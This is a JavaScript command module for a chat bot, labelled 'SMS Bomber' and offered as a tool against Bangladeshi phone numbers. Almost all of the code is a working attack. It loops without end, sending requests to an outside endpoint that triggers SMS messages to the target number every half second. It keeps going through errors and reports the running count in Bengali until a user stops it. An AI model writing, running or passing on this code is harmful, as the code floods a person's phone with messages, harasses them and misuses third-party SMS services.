const axios = require("axios");

// Global bombing flags
const bombingFlags = {};

module.exports = {
  config: {
    name: "sms",
    version: "2.0.0",
    author: "CYBER TEAM (Converted by OMOR TE)",
    countDown: 0,
    role: 0,
    shortDescription: "SMS Bomber",
    longDescription: "SMS bombing tool for Bangladesh numbers",
    guide: "{p}sms 01xxxxxxxxx | {p}sms off",
    category: "tool"
  },

  onStart: async function ({ message, event, args, api }) {
    const threadID = event.threadID;
    const number = args[0];
    
    // OFF command
    if (number === "off") {
      if (bombingFlags[threadID]) {
        bombingFlags[threadID] = false;
        return message.reply("✅ SMS বোম্বার বন্ধ করা হয়েছে।");
      } else {
        return message.reply("❗ এই থ্রেডে কোনো বোম্বিং চলছিল না।");
      }
    }
    
    // Validate number
    if (!/^01[0-9]{9}$/.test(number)) {
      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n❌ ভুল নাম্বার ফরম্যাট!\n📌 সঠিক ব্যবহার: sms 01xxxxxxxxx\n📌 বন্ধ করতে: sms off\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু বাংলাদেশি নাম্বার দিন`);
    }
    
    // Check if already bombing
    if (bombingFlags[threadID]) {
      return message.reply("❗ এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে: sms off");
    }
    
    // Start bombing
    bombingFlags[threadID] = true;
    
    // Confirmation message
    const confirmMsg = await message.reply(`📱 **SMS BOMBER STARTED**\n━━━━━━━━━━━━━━━━━━━━\n📞 নম্বর: ${number}\n⏳ স্ট্যাটাস: বোম্বিং চলছে...\n📌 বন্ধ করতে: sms off\n━━━━━━━━━━━━━━━━━━━━`);
    
    // Start bombing loop
    (async function startBombing() {
      let count = 0;
      
      while (bombingFlags[threadID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`, { timeout: 5000 });
          count++;
          
          // Update progress every 10 SMS
          if (count % 10 === 0) {
            try {
              await api.editMessage(
                `📱 **SMS BOMBER RUNNING**\n━━━━━━━━━━━━━━━━━━━━\n📞 নম্বর: ${number}\n📊 পাঠানো হয়েছে: ${count} টি\n⏳ স্ট্যাটাস: চলছে...\n📌 বন্ধ করতে: sms off\n━━━━━━━━━━━━━━━━━━━━`,
                confirmMsg.messageID
              );
            } catch(e) {}
          }
          
          // Small delay to avoid rate limiting
          await new Promise(resolve => setTimeout(resolve, 500));
          
        } catch (err) {
          console.error("SMS bombing error:", err);
          // Don't stop on single error, continue
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
      
      // Final message when stopped
      try {
        await api.editMessage(
          `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📞 নম্বর: ${number}\n📊 মোট পাঠানো: ${count} টি\n🛑 বন্ধ করা হয়েছে\n━━━━━━━━━━━━━━━━━━━━`,
          confirmMsg.messageID
        );
      } catch(e) {}
    })();
  }
};
